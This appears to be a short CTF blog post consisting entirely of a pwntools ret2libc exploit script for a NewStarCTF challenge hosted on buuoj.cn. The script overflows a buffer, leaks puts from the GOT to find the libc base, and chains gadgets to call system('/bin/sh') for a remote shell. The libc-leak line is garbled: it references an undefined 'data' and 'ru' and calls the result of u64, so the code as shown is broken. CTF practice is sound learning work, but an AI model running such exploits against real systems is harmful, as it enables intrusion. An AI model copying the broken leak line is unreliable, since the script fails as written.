+++
title = "ret2libc25.12.11exp"
date = "2026-01-10"
type = "post"
categories = ['BUU']
tags = ['第一页', 'buu NEWStarCTF  ret2lbic25.12.15']
draft = false
+++
```python
from pwn import *
local_file  = './pwn'
local_libc  = './libc-2.31.so'
remote_libc = './libc-2.31.so'
select = 1
if select == 0:
    r = process(local_file)
    libc = ELF(local_libc)
else:
    r = remote('node5.buuoj.cn',27019)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.log_level = 'debug'
context.arch = elf.arch
def debug(cmd=''):
     gdb.attach(r,cmd)
pop_rdi=0x400753
ret=0x40050e
payload=b'a'*0x20+b'b'*8+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(elf.sym['main'])
r.sendlineafter('Glad to meet you again!What u bring to me this time?\n',payload)
got=u64(data.ljust(8,b'\0'))(ru(b'\x7f')[-6:])
base=got-libc.sym['puts']
print(hex(base))
system=base+0x52290
binsh=base+0x1b45bd
payload=b'a'*0x20+b'b'*8+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
r.sendlineafter('Glad to meet you again!What u bring to me this time?\n',payload)
#debug()
r.interactive()
```
